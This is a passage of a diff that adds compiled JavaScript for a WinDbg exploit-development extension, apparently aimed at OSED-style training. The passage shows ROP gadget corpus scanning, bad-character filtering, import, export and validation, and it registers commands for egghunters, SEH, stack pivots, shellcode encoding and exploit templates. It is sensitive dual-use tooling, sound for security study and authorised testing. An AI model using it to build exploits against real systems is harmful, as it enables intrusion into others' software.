+      merged.constraints = __spreadProps(__spreadValues({}, merged.constraints), { maximumPayloadLength: Number(overrides.maximumPayloadLength) });
+    }
+    return merged;
+  }
+  function diagnoseModuleBadchars(moduleName, badchars) {
+    var _a;
+    try {
+      const modules = listModulesWithMitigations(moduleName);
+      const mod = modules.find((m) => m.name.toLowerCase().includes(moduleName.toLowerCase()));
+      if (!mod)
+        return void 0;
+      const badSet = new Set(badchars);
+      const base = mod.base;
+      const baseBytes = [];
+      const pointerSize = getPointerSize();
+      for (let i = 0; i < pointerSize; i++) {
+        baseBytes.push(Number(__bi.and(__bi.shr(base, __bi(i * 8)), __bi(255))));
+      }
+      const offending = baseBytes.map((b, i) => ({ byte: b, position: i })).filter((entry) => badSet.has(entry.byte));
+      if (offending.length === 0)
+        return void 0;
+      const baseHex = `0x${base.toString(16).toUpperCase().padStart(pointerSize * 2, "0")}`;
+      const packed = baseBytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+      const byByte = /* @__PURE__ */ new Map();
+      for (const entry of offending) {
+        const list = (_a = byByte.get(entry.byte)) != null ? _a : [];
+        list.push(entry.position);
+        byByte.set(entry.byte, list);
+      }
+      const badSummary = [...byByte.entries()].map(([byte, positions]) => {
+        const hex4 = `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`;
+        const posStr = positions.length === 1 ? `offset ${positions[0]}` : positions.length === positions[positions.length - 1] - positions[0] + 1 ? `offsets ${positions[0]}-${positions[positions.length - 1]}` : `offsets ${positions.join(",")}`;
+        return `${hex4} (${posStr})`;
+      }).join(", ");
+      return `${mod.name} base ${baseHex} | packed: ${packed} | bad bytes: ${badSummary}. No usable gadget addresses.`;
+    } catch (e) {
+      return void 0;
+    }
+  }
+  function invalidateCorpusPlans() {
+    corpusGeneration++;
+    ropPlans.clear();
+    nextRopPlanId = 1;
+  }
+  function resetCorpusModules() {
+    corpusModules = [];
+  }
+  function corpusReportModules() {
+    return corpusModules.map((module) => {
+      var _a;
+      return {
+        name: module.name,
+        base: module.base,
+        aslr: (_a = module.aslr) != null ? _a : "unknown"
+      };
+    });
+  }
+  function moduleInfoByName(name) {
+    var _a;
+    if (!name || name === "<all>")
+      return void 0;
+    const matches = listModulesWithMitigations(name);
+    return (_a = matches.find((m) => m.name.toLowerCase() === name.toLowerCase())) != null ? _a : matches[0];
+  }
+  function buildStableAddressPredicate() {
+    const relocated = [];
+    for (const mod of listModulesWithMitigations()) {
+      if (mod.preferredBase !== void 0 && mod.preferredBase !== __bi(0) && mod.base !== mod.preferredBase) {
+        relocated.push([mod.base, mod.base + mod.size]);
+      }
+    }
+    return (address) => !relocated.some(([lo, hi]) => address >= lo && address < hi);
+  }
+  function corpusStaleModules() {
+    var _a;
+    const tracked = corpusModules.filter((entry) => entry.base !== void 0);
+    if (tracked.length === 0)
+      return [];
+    const live = listModulesWithMitigations();
+    const stale = [];
+    for (const entry of tracked) {
+      const needle = entry.name.toLowerCase();
+      const match = (_a = live.find((m) => m.name.toLowerCase() === needle)) != null ? _a : live.find((m) => m.name.toLowerCase().includes(needle) || m.path.toLowerCase().includes(needle));
+      const now = match == null ? void 0 : match.base;
+      if (now === void 0 || now !== entry.base) {
+        stale.push({ name: entry.name, was: entry.base, now });
+      }
+    }
+    return stale;
+  }
+  function getGlobalObject() {
+    if (typeof globalThis !== "undefined") {
+      return globalThis;
+    }
+    if (typeof self !== "undefined") {
+      return self;
+    }
+    return void 0;
+  }
+  function publishOsed() {
+    const globalObject = getGlobalObject();
+    if (globalObject) {
+      globalObject.osed = osed;
+    }
+  }
+  function writeProofText(path, content) {
+    var _a, _b, _c, _d, _e, _f;
+    const hostAny = host;
+    const raw = (_e = (_d = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.Utility) == null ? void 0 : _c.FileSystem) == null ? void 0 : _d.CreateFile) == null ? void 0 : _e.call(_d, path, "CreateAlways");
+    if (!raw)
+      throw new Error("WinDbg host filesystem is unavailable.");
+    const file = raw;
+    if (typeof file.WriteBytes !== "function")
+      throw new Error("WinDbg host file does not support WriteBytes.");
+    try {
+      const bytes = [];
+      for (let index = 0; index < content.length; index += 1) {
+        let code = content.charCodeAt(index);
+        if (code >= 55296 && code <= 56319 && index + 1 < content.length) {
+          const low = content.charCodeAt(index + 1);
+          if (low >= 56320 && low <= 57343) {
+            code = 65536 + (code - 55296 << 10) + (low - 56320);
+            index += 1;
+          }
+        }
+        if (code <= 127)
+          bytes.push(code);
+        else if (code <= 2047)
+          bytes.push(192 | code >> 6, 128 | code & 63);
+        else if (code <= 65535)
+          bytes.push(224 | code >> 12, 128 | code >> 6 & 63, 128 | code & 63);
+        else
+          bytes.push(240 | code >> 18, 128 | code >> 12 & 63, 128 | code >> 6 & 63, 128 | code & 63);
+      }
+      file.WriteBytes(bytes);
+    } finally {
+      (_f = file.Close) == null ? void 0 : _f.call(file);
+    }
+  }
+  function utf8ByteLength(content) {
+    let length = 0;
+    for (let index = 0; index < content.length; index += 1) {
+      const code = content.charCodeAt(index);
+      if (code <= 127)
+        length += 1;
+      else if (code <= 2047)
+        length += 2;
+      else if (code >= 55296 && code <= 56319 && index + 1 < content.length && content.charCodeAt(index + 1) >= 56320 && content.charCodeAt(index + 1) <= 57343) {
+        length += 4;
+        index += 1;
+      } else
+        length += 3;
+    }
+    return length;
+  }
+  function readText(path) {
+    var _a, _b, _c, _d, _e, _f, _g;
+    const hostAny = host;
+    const fs = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.Utility) == null ? void 0 : _c.FileSystem;
+    const raw = (_f = (_d = fs == null ? void 0 : fs.OpenFile) == null ? void 0 : _d.call(fs, path)) != null ? _f : (_e = fs == null ? void 0 : fs.CreateFile) == null ? void 0 : _e.call(fs, path, "OpenExisting");
+    const file = raw;
+    if (!file || typeof file.ReadBytes !== "function")
+      throw new Error("WinDbg host filesystem read support is unavailable.");
+    try {
+      const bytes = [];
+      for (; ; ) {
+        const chunk = Array.from(file.ReadBytes(64 * 1024), Number);
+        if (chunk.length === 0)
+          break;
+        bytes.push(...chunk);
+        if (chunk.length < 64 * 1024)
+          break;
+      }
+      return String.fromCharCode(...bytes);
+    } finally {
+      (_g = file.Close) == null ? void 0 : _g.call(file);
+    }
+  }
+  function fingerprintCorpus(index) {
+    const modules = /* @__PURE__ */ new Map();
+    const samples = [];
+    const seen = /* @__PURE__ */ new Set();
+    for (const gadget of index.gadgets) {
+      for (const location of gadget.locations) {
+        if (location.virtualAddress === void 0 || seen.has(location.virtualAddress) || samples.length >= 128)
+          continue;
+        seen.add(location.virtualAddress);
+        const address = __bi(location.virtualAddress);
+        const module = findModuleByAddress(address);
+        if (!module)
+          continue;
+        const bytes = tryReadMemory(address, Math.min(16, Math.max(1, gadget.instructions.length * 4)));
+        if (!bytes)
+          continue;
+        modules.set(`${module.name}\0${module.path}`, { name: module.name, path: module.path, base: Number(module.base), size: Number(module.size) });
+        samples.push({ address: location.virtualAddress, bytes: [...bytes] });
+      }
+    }
+    return { modules: [...modules.values()], samples };
+  }
+  function registerAll() {
+    const commands = [
+      ...createPatternCommands(),
+      createBadcharsCommand(),
+      createBadcharArrayCommand(),
+      createBadcharFunctionCommand(),
+      createBadcharFindCommand(),
+      createEgghunterCommand(),
+      createSehCommand(),
+      createModulesCommand(),
+      ...createRopCommands(),
+      createPivotCommand(),
+      createSehPprCommand(),
+      createTriageCommand(),
+      createFindMspCommand(),
+      createFindPtrCommand(),
+      createMemoryCommand(),
+      createFindMemBytesCommand(),
+      createFindStackBytesCommand(),
+      createLandingCommand(),
+      createStackmapCommand(),
+      ...createLeakCommands(),
+      createMathCommand(),
+      createVersionCommand(),
+      ...createStringCommands(),
+      createCodeCavesCommand(),
+      createEncodeCommand(),
+      createNopCommand(),
+      createRopTemplateCommand(),
+      ...createFmtCommands(),
+      createExploitCommand(),
+      createHelpCommand(registry),
+      createReloadCommand(registry)
+    ];
+    for (const command2 of commands) {
+      registry.register(command2);
+    }
+  }
+  function bindApi() {
+    const api = {};
+    const sc = createShellcodeNamespace();
+    const invoke = (commandName, args) => {
+      if (args.length === 1 && args[0] === "help") {
+        const result4 = registry.execute("help", { command: commandName });
+        lastResult = result4;
+        return result4.success;
+      }
+      const result3 = registry.execute(commandName, normalizeInvocation(commandName, args));
+      lastResult = result3;
+      if (commandName === "triage" && result3.success && result3.findings.length > 0) {
+        cachedExploitState = buildExploitStateFromTriage(result3.findings[0]);
+      }
+      if (!result3.success) {
+        for (const error2 of result3.errors) {
+          error(error2);
+        }
+        const command2 = registry.get(commandName);
+        if (command2) {
+          info(`Usage: ${command2.usage}`);
+        }
+      }
+      return result3.success;
+    };
+    const setResult = (result3) => {
+      lastResult = result3;
+    };
+    const renderRows = (title, rows) => {
+      if (rows.length === 0) {
+        return;
+      }
+      section(title);
+      if (rows.length > 0 && "Error" in rows[0]) {
+        error(rows[0].Error);
+        return;
+      }
+      const keys = [...new Set(rows.flatMap((row) => Object.keys(row)))];
+      table(keys.map((key2) => ({ key: key2, header: key2 })), rows);
+    };
+    const formatSet = (values) => {
+      return [...values].map((value) => String(value)).join(", ");
+    };
+    const formatSemanticField = (field) => {
+      if (field.values.unknown) {
+        return "unknown";
+      }
+      const parts = [];
+      if (field.values.exact.size > 0) {
+        parts.push(`exact=${formatSet(field.values.exact)}`);
+      }
+      if (field.values.conservative.size > 0) {
+        parts.push(`conservative=${formatSet(field.values.conservative)}`);
+      }
+      return parts.length > 0 ? `${field.confidence.toLowerCase()}(${parts.join("; ")})` : "none";
+    };
+    const gadgetStackDisplay = (gadget) => {
+      if (gadget.categories.includes("STACK_PIVOT"))
+        return "DYN";
+      const field = gadget.semanticSummary.summary.stackDelta;
+      if (field.values.unknown || field.values.conservative.size > 0 || field.values.exact.size !== 1)
+        return "?";
+      const value = [...field.values.exact][0];
+      return value > 0 ? `+${value}` : String(value);
+    };
+    const primaryCapability = (gadget) => {
+      var _a, _b, _c, _d;
+      if (gadget.categories.includes("STACK_PIVOT"))
+        return "STACK_PIVOT";
+      return (_d = (_c = (_a = gadget.capabilities.find((capability2) => capability2.kind === "MEMORY_WRITE")) == null ? void 0 : _a.kind) != null ? _c : (_b = gadget.capabilities[0]) == null ? void 0 : _b.kind) != null ? _d : "?";
+    };
+    const queryRows = (query, verbose = false) => {
+      if (!currentRopCorpus) {
+        return [{ Error: NO_ROP_CORPUS_MESSAGE }];
+      }
+      const gadgets = currentRopCorpus.query(query);
+      const pointerSize = getPointerSize();
+      return gadgets.map((gadget) => {
+        var _a;
+        const location = gadget.locations[0];
+        const compact = {
+          Address: (location == null ? void 0 : location.virtualAddress) !== void 0 ? formatAddress(__bi(location.virtualAddress), pointerSize) : "n/a",
+          Sequence: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
+          Capability: primaryCapability(gadget),
+          Stack: gadgetStackDisplay(gadget),
+          Score: gadget.score.toString()
+        };
+        if (!verbose)
+          return compact;
+        return __spreadProps(__spreadValues({}, compact), {
+          Module: (_a = location == null ? void 0 : location.module) != null ? _a : "n/a",
+          Terminator: [...gadget.semanticSummary.summary.flowEffects.values.exact].join(", ") || "none",
+          Reads: formatSemanticField(gadget.semanticSummary.summary.reads),
+          Writes: formatSemanticField(gadget.semanticSummary.summary.writes),
+          MemoryReads: formatSemanticField(gadget.semanticSummary.summary.memoryReads),
+          MemoryWrites: formatSemanticField(gadget.semanticSummary.summary.memoryWrites),
+          StackDelta: formatSemanticField(gadget.semanticSummary.summary.stackDelta),
+          Capabilities: gadget.capabilities.map((capability2) => capability2.kind).join(", ")
+        });
+      });
+    };
+    const capabilityRows = () => {
+      if (!currentRopCorpus) {
+        return [{ Error: NO_ROP_CORPUS_MESSAGE }];
+      }
+      return summarizeCapabilities(currentRopCorpus);
+    };
+    const helperHelp = (name) => {
+      const entry = findHelpEntry(name);
+      const rows = entry ? helpRows(entry) : [{ Error: `Unknown helper '${name}'.` }];
+      renderRows(`Help: ${name}`, rows);
+      setResult({
+        command: "help",
+        args: { command: name },
+        success: entry !== void 0,
+        findings: rows,
+        warnings: [],
+        errors: entry ? [] : [`Unknown helper '${name}'.`]
+      });
+      return toDxResult(`Help: ${name}`, rows);
+    };
+    const staleCorpusGuard = (title, command2) => {
+      const stale = corpusStaleModules();
+      if (stale.length === 0)
+        return void 0;
+      const detail = stale.map((s) => `${s.name} ${hex32(s.was)} -> ${s.now !== void 0 ? hex32(s.now) : "not loaded"}`).join("; ");
+      const message = `Corpus is STALE \u2014 module(s) rebased since scan: ${detail}. These non-ASLR modules relocated (e.g. after a target relaunch), so the corpus's gadget addresses now point at the wrong memory. Re-run rop.scan_live(...) for them before building a chain.`;
+      const rows = [{ Error: message }];
+      renderRows(title, rows);
+      setResult({ command: command2, args: {}, success: false, findings: [], warnings: [], errors: [message] });
+      return toDxResult(title, rows);
+    };
+    const scanCorpus = (text, options = {}, badchars) => {
+      pendingImportedCorpus = void 0;
+      corpusOrigin = "rpplus";
+      corpusValidation = "unknown";
+      corpusBadchars = badchars ? [...badchars] : [];
+      invalidateCorpusPlans();
+      resetCorpusModules();
+      const raw = buildCapabilityIndexFromRpPlusText(text, options);
+      const warnings = [];
+      let filteredCount = 0;
+      if (badchars && badchars.length > 0) {
+        const { filtered, removedCount } = filterCorpusByBadchars(raw, badchars);
+        filteredCount = removedCount;
+        currentRopCorpus = filtered;
+        if (removedCount > 0) {
+          const byteList3 = badchars.map((b) => `0x${(b & 255).toString(16).toUpperCase().padStart(2, "0")}`).join(" ");
+          warnings.push(`${removedCount} gadget(s) filtered \u2014 address contains badchar(s): ${byteList3}`);
+        }
+      } else {
+        currentRopCorpus = raw;
+      }
+      const rows = summarizeCapabilities(currentRopCorpus);
+      section("ROP Corpus Loaded");
+      info(`Gadgets: ${currentRopCorpus.gadgets.length}`);
+      if (filteredCount > 0)
+        info(`Filtered: ${filteredCount} (badchar address)`);
+      info(`Capabilities: ${rows.length}`);
+      for (const w of warnings)
+        warn(w);
+      setResult({
+        command: "rop.scan",
+        args: __spreadValues({ text }, options),
+        success: true,
+        findings: [{ gadgets: currentRopCorpus.gadgets.length, capabilities: rows.length, filtered: filteredCount }],
+        warnings,
+        errors: []
+      });
+      return toDxResult("ROP Corpus Loaded", [
+        { Corpus: "loaded", Gadgets: currentRopCorpus.gadgets.length.toString(), Filtered: filteredCount.toString(), Capabilities: rows.length.toString() }
+      ]);
+    };
+    const scanLiveCorpus = (modules, options, append) => {
+      var _a;
+      pendingImportedCorpus = void 0;
+      corpusOrigin = "live";
+      corpusValidation = "sampled";
+      corpusBadchars = Array.isArray(options.badchars) ? [...options.badchars] : [];
+      const discoveries = modules.map((module) => discoverLiveGadgets(__spreadProps(__spreadValues({}, options), { module })));
+      const discoveredIndexes = discoveries.map((discovery) => buildCapabilityIndexFromSequences(sequencesFromLiveHits(discovery.hits)));
+      invalidateCorpusPlans();
+      if (!append)
+        resetCorpusModules();
+      const indexes = append && currentRopCorpus ? [currentRopCorpus, ...discoveredIndexes] : discoveredIndexes;
+      currentRopCorpus = mergeCapabilityIndexes(indexes);
+      const capRows = summarizeCapabilities(currentRopCorpus);
+      const stats = discoveries.reduce((total, discovery) => {
+        var _a2, _b, _c, _d, _e, _f, _g, _h;
+        return {
+          patterns: total.patterns + discovery.stats.patterns,
+          scanned: total.scanned + discovery.stats.scanned,
+          discovered: total.discovered + discovery.stats.discovered,
+          rejected: total.rejected + discovery.stats.rejected,
+          backwardTerminators: total.backwardTerminators + ((_a2 = discovery.stats.backwardTerminators) != null ? _a2 : 0),
+          backwardDispatch: total.backwardDispatch + ((_b = discovery.stats.backwardDispatch) != null ? _b : 0),
+          backwardNonSequentialRejected: total.backwardNonSequentialRejected + ((_c = discovery.stats.backwardNonSequentialRejected) != null ? _c : 0),
+          backwardGadgets: total.backwardGadgets + ((_d = discovery.stats.backwardGadgets) != null ? _d : 0),
+          backwardRawCandidates: total.backwardRawCandidates + ((_e = discovery.stats.backwardRawCandidates) != null ? _e : 0),
+          backwardFiltered: total.backwardFiltered + ((_f = discovery.stats.backwardFiltered) != null ? _f : 0),
+          backwardLimit: total.backwardLimit + ((_g = discovery.stats.backwardLimit) != null ? _g : 0),
+          backwardComplete: Math.min(total.backwardComplete, (_h = discovery.stats.backwardComplete) != null ? _h : 1)
+        };
+      }, { patterns: 0, scanned: 0, discovered: 0, rejected: 0, backwardTerminators: 0, backwardDispatch: 0, backwardNonSequentialRejected: 0, backwardGadgets: 0, backwardRawCandidates: 0, backwardFiltered: 0, backwardLimit: 0, backwardComplete: 1 });
+      const warnings = discoveries.flatMap((discovery) => discovery.warnings);
+      const badcharsArray = Array.isArray(options.badchars) ? options.badchars : [];
+      for (let i = 0; i < modules.length; i++) {
+        const mod = modules[i];
+        const disc = discoveries[i];
+        const accepted = disc.stats.discovered;
+        const rejected = disc.stats.rejected;
+        let reason;
+        if (mod && disc.stats.scanned > 0 && accepted === 0 && badcharsArray.length > 0) {
+          reason = diagnoseModuleBadchars(mod, badcharsArray);
+          if (reason)
+            warnings.push(reason);
+        }
+        const modName = mod != null ? mod : "<all>";
+        const moduleInfo = moduleInfoByName(modName);
+        const base = moduleInfo == null ? void 0 : moduleInfo.base;
+        const existing = corpusModules.find((m) => m.name === modName);
+        if (existing) {
+          existing.accepted = accepted;
+          existing.rejected = rejected;
+          existing.usable = accepted > 0;
+          existing.reason = reason;
+          existing.base = base;
+          existing.aslr = moduleInfo == null ? void 0 : moduleInfo.aslr;
+        } else {
+          corpusModules.push({
+            name: modName,
+            accepted,
+            rejected,
+            usable: accepted > 0,
+            reason,
+            base,
+            aslr: moduleInfo == null ? void 0 : moduleInfo.aslr
+          });
+        }
+      }
+      section("Module Scan");
+      for (let i = 0; i < modules.length; i++) {
+        const mod = (_a = modules[i]) != null ? _a : "<all>";
+        const disc = discoveries[i];
+        const accepted = disc.stats.discovered;
+        const rejected = disc.stats.rejected;
+        info(`${mod}: ${accepted} raw gadgets accepted, ${rejected} rejected`);
+      }
+      section("Corpus Summary");
+      info(`Mode: ${append ? "append" : "replace"}`);
+      info(`Modules: ${corpusModules.map((m) => m.name).join(", ")}`);
+      info(`Semantic gadgets: ${currentRopCorpus.gadgets.length} (deduplicated)`);
+      info(`Capabilities: ${capRows.length}`);
+      if (stats.backwardTerminators > 0) {
+        info(`Backward scan: ${stats.backwardTerminators} RET terminators | ${stats.backwardDispatch} dispatch candidates | ${stats.backwardRawCandidates}/${stats.backwardLimit} raw candidates | ${stats.backwardGadgets} accepted | ${stats.backwardFiltered} filtered | ${stats.backwardNonSequentialRejected} non-sequential RET paths excluded | complete: ${stats.backwardComplete === 1 ? "yes" : "no (candidate limit reached)"}`);
+      }
+      for (const warning of warnings) {
+        warn(warning);
+      }
+      setResult({
+        command: "rop.scan_live",
+        args: __spreadValues({ modules, append }, options),
+        success: true,
+        findings: [__spreadValues({ modules: corpusModules.length, gadgets: currentRopCorpus.gadgets.length, capabilities: capRows.length }, stats)],
+        warnings,
+        errors: []
+      });
+      const uniqueModuleNames = corpusModules.map((m) => m.name).join(", ");
+      return toDxResult("Live ROP Corpus", [
+        ...modules.map((mod, i) => {
+          const disc = discoveries[i];
+          return {
+            Section: "Module Scan",
+            Module: mod != null ? mod : "<all>",
+            "Raw Accepted": disc.stats.discovered.toString(),
+            Rejected: (disc.stats.scanned - disc.stats.discovered).toString()
+          };
+        }),
+        {
+          Section: "Corpus Summary",
+          Module: uniqueModuleNames,
+          "Raw Accepted": "",
+          Rejected: "",
+          "Semantic Gadgets": currentRopCorpus.gadgets.length.toString(),
+          Capabilities: capRows.length.toString()
+        }
+      ]);
+    };
+    const executeRopScanLive = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.scan_live");
+      }
+      const options = isPlainObject(args[0]) ? args[0] : parseScanLivePositionalArgs(args);
+      const requested = Array.isArray(options.modules) ? options.modules : Array.isArray(options.module) ? options.module : [options.module];
+      const modules = requested.map((module) => module === void 0 ? void 0 : String(module).trim()).filter((module) => module === void 0 || module.length > 0);
+      const parsedBadchars = parseHexByteList(options.badchars);
+      return scanLiveCorpus(modules.length > 0 ? modules : [void 0], {
+        badchars: Array.isArray(parsedBadchars) ? parsedBadchars : void 0,
+        maxPerPattern: options.maxPerPattern,
+        maxInstructionsPerGadget: options.maxInstructionsPerGadget,
+        maxBackwardGadgets: options.maxBackwardGadgets
+      }, Boolean(options.append));
+    };
+    const executeRopScan = (...args) => {
+      var _a, _b, _c;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.scan");
+      }
+      if (args.length === 0) {
+        const rows = [{ Error: "rop.scan requires RP++ text input." }];
+        setResult({
+          command: "rop.scan",
+          args: {},
+          success: false,
+          findings: [],
+          warnings: [],
+          errors: ["RP++ text input is required."]
+        });
+        return toDxResult("ROP Scan", rows);
+      }
+      if (args.length >= 1 && typeof args[0] === "string") {
+        const scanBadchars = typeof args[1] === "string" ? parseHexByteList(args[1]) : void 0;
+        return scanCorpus(args[0], {}, Array.isArray(scanBadchars) ? scanBadchars : void 0);
+      }
+      const options = isPlainObject(args[0]) ? args[0] : {};
+      const text = (_c = (_b = (_a = options.text) != null ? _a : options.output) != null ? _b : options.value) != null ? _c : args[0];
+      if (typeof text !== "string" || text.trim().length === 0) {
+        const rows = [{ Error: "rop.scan requires a text property containing RP++ output." }];
+        setResult({
+          command: "rop.scan",
+          args: options,
+          success: false,
+          findings: [],
+          warnings: [],
+          errors: ["RP++ text input is required."]
+        });
+        return toDxResult("ROP Scan", rows);
+      }
+      const parsedBadchars = parseHexByteList(options.badchars);
+      return scanCorpus(text, {
+        source: options.source,
+        provenance: options.provenance,
+        preserveEmptyLines: options.preserveEmptyLines
+      }, Array.isArray(parsedBadchars) ? parsedBadchars : void 0);
+    };
+    const executeCorpusExport = (...args) => {
+      const path = typeof args[0] === "string" ? args[0] : void 0;
+      if (!currentRopCorpus) {
+        setResult({ command: "rop.corpus.export", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP Corpus Export", [{ Error: NO_ROP_CORPUS_MESSAGE }]);
+      }
+      const startedAt = Date.now();
+      const text = exportCorpus(currentRopCorpus, fingerprintCorpus(currentRopCorpus));
+      try {
+        if (path)
+          writeProofText(path, text);
+      } catch (error2) {
+        const message = error2 instanceof Error ? error2.message : String(error2);
+        setResult({ command: "rop.corpus.export", args: path ? { path } : {}, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("ROP Corpus Export", [{ Error: "Could not write '" + (path != null ? path : "(console)") + "': " + message }]);
+      }
+      const elapsedSeconds = ((Date.now() - startedAt) / 1e3).toFixed(1);
+      const bytes = utf8ByteLength(text);
+      const rows = [{
+        Status: path ? "written" : "ready",
+        File: path != null ? path : "(console)",
+        Gadgets: currentRopCorpus.gadgets.length.toString(),
+        Bytes: bytes.toString(),
+        Elapsed: `${elapsedSeconds}s`
+      }];
+      if (path)
+        info(`ROP corpus export complete in ${elapsedSeconds}s (${bytes} bytes).`);
+      renderRows("ROP Corpus Export", rows);
+      if (!path)
+        print(text + "\n");
+      setResult({ command: "rop.corpus.export", args: path ? { path } : {}, success: true, findings: rows, warnings: [], errors: [] });
+      return toDxResult("ROP Corpus Export", rows);
+    };
+    const executeCorpusReport = (...args) => {
+      const path = typeof args[0] === "string" ? args[0] : void 0;
+      const index = currentRopCorpus != null ? currentRopCorpus : pendingImportedCorpus == null ? void 0 : pendingImportedCorpus.index;
+      if (!index) {
+        const message = "No ROP corpus is available. Run rop.scan(...) or rop.scan_live(...) first.";
+        setResult({ command: "rop.corpus.report", args: {}, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("ROP Corpus Report", [{ Error: message }]);
+      }
+      const importedPending = currentRopCorpus === void 0 && pendingImportedCorpus !== void 0;
+      const modules = importedPending ? pendingImportedCorpus.fingerprint.modules.map((module) => ({ name: module.name, base: __bi(module.base), aslr: "unknown" })) : corpusReportModules();
+      const text = formatCorpusReport(index, {
+        pointerSize: getPointerSize(),
+        origin: importedPending ? "imported" : corpusOrigin,
+        validation: importedPending ? "unverified" : corpusValidation,
+        modules,
+        badchars: importedPending ? void 0 : corpusBadchars
+      });
+      try {
+        if (path)
+          writeProofText(path, text);
+      } catch (error2) {
+        const message = error2 instanceof Error ? error2.message : String(error2);
+        setResult({ command: "rop.corpus.report", args: path ? { path } : {}, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("ROP Corpus Report", [{ Error: "Could not write '" + path + "': " + message }]);
+      }
+      if (!path) {
+        for (const line of text.split("\n"))
+          print(line);
+        print("");
+      }
+      const rows = [{ Status: path ? "written" : "printed", File: path != null ? path : "(console)", Gadgets: index.gadgets.length.toString() }];
+      if (path)
+        renderRows("ROP Corpus Report", rows);
+      setResult({
+        command: "rop.corpus.report",
+        args: path ? { path } : {},
+        success: true,
+        findings: rows,
+        warnings: importedPending ? ["Imported corpus addresses are unverified."] : [],
+        errors: []
+      });
+      return toDxResult("ROP Corpus Report", rows);
+    };
+    const executeCorpusImport = (...args) => {
+      const path = typeof args[0] === "string" ? args[0] : void 0;
+      if (!path) {
+        const message = "rop.corpus.import requires a JSON file path.";
+        setResult({ command: "rop.corpus.import", args: {}, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("ROP Corpus Import", [{ Error: message }]);
+      }
+      try {
+        pendingImportedCorpus = importCorpus(readText(path));
+        currentRopCorpus = void 0;
+        corpusOrigin = "imported";
+        corpusValidation = "unverified";
+        corpusBadchars = void 0;
+        invalidateCorpusPlans();
+        resetCorpusModules();
+        const rows = [{ Status: "stale-imported", File: path, Gadgets: pendingImportedCorpus.index.gadgets.length.toString() }];
+        renderRows("ROP Corpus Import", rows);
+        setResult({ command: "rop.corpus.import", args: { path }, success: true, findings: rows, warnings: ["Imported corpus is inactive until validation succeeds."], errors: [] });
+        return toDxResult("ROP Corpus Import", rows);
+      } catch (error2) {
+        const message = error2 instanceof Error ? error2.message : String(error2);
+        setResult({ command: "rop.corpus.import", args: { path }, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("ROP Corpus Import", [{ Error: message }]);
+      }
+    };
+    const executeCorpusValidate = () => {
+      if (!pendingImportedCorpus) {
+        const message = "No imported ROP corpus is awaiting validation.";
+        setResult({ command: "rop.corpus.validate", args: {}, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("ROP Corpus Validate", [{ Error: message }]);
+      }
+      const result3 = validateCorpus(pendingImportedCorpus, fingerprintCorpus(pendingImportedCorpus.index));
+      if (!result3.valid) {
+        const rows2 = [{ Status: "stale", Detail: result3.reasons.join("; ") }];
+        renderRows("ROP Corpus Validate", rows2);
+        setResult({ command: "rop.corpus.validate", args: {}, success: false, findings: [], warnings: [], errors: result3.reasons });
+        return toDxResult("ROP Corpus Validate", rows2);
+      }
+      currentRopCorpus = pendingImportedCorpus.index;
+      pendingImportedCorpus = void 0;
+      corpusOrigin = "imported";
+      corpusValidation = "sampled";
+      corpusBadchars = void 0;
+      invalidateCorpusPlans();
+      const rows = [{ Status: "validated", Detail: "module mappings and sampled gadget bytes match" }];
+      renderRows("ROP Corpus Validate", rows);
+      setResult({ command: "rop.corpus.validate", args: {}, success: true, findings: rows, warnings: [], errors: [] });
+      return toDxResult("ROP Corpus Validate", rows);
+    };
+    const executeCorpusLookup = (...args) => {
+      if (args.length === 1 && args[0] === "help")
+        return helperHelp("rop.corpus.lookup");
+      const address = Number(args[0]);
+      if (!Number.isFinite(address)) {
+        const rows2 = [{ Status: "ERROR", Detail: "rop.corpus.lookup requires a numeric gadget address." }];
+        renderRows("ROP Corpus Lookup", rows2);
+        return toDxResult("ROP Corpus Lookup", rows2);
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Status: "ERROR", Detail: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Corpus Lookup", rows2);
+        return toDxResult("ROP Corpus Lookup", rows2);
+      }
+      const matches = currentRopCorpus.gadgets.filter((gadget) => gadget.locations.some((location) => location.virtualAddress === address >>> 0));
+      if (matches.length === 0) {
+        const rows2 = [{ Status: "NOT_FOUND", Address: hex32(__bi(address)), Detail: "Address is not in the active corpus; lookup does not scan memory." }];
+        renderRows("ROP Corpus Lookup", rows2);
+        return toDxResult("ROP Corpus Lookup", rows2);
+      }
+      const rows = matches.map((gadget) => ({
+        Status: "FOUND",
+        Address: hex32(__bi(address)),
+        Sequence: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
+        StackDelta: formatSemanticField(gadget.semanticSummary.summary.stackDelta),
+        Reads: formatSemanticField(gadget.semanticSummary.summary.reads),
+        Writes: formatSemanticField(gadget.semanticSummary.summary.writes),
+        Capabilities: gadget.capabilities.map((capability2) => capability2.kind).join(", "),
+        Locations: gadget.locations.map((location) => {
+          var _a;
+          return (_a = location.module) != null ? _a : "unknown";
+        }).join(", "),
+        Validation: corpusValidation
+      }));
+      renderRows("ROP Corpus Lookup", rows);
+      setResult({ command: "rop.corpus.lookup", args: { address }, success: true, findings: matches, warnings: [], errors: [] });
+      return toDxResult("ROP Corpus Lookup", rows);
+    };
+    const executeRopQuery = (...args) => {
+      var _b;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.query");
+      }
+      let query;
+      let verbose = false;
+      let fieldError;
+      const listFields = [
+        "reads",
+        "writes",
+        "preserves",
+        "preservesThroughout",
+        "capability",
+        "terminator"
+      ];
+      const scalarFields = [
+        "stackDelta",
+        "memoryReads",
+        "memoryWrites",
+        "memoryRead",
+        "memoryWrite",
+        "executableOnly"
+      ];
+      const fieldAliases = {
+        write: "writes",
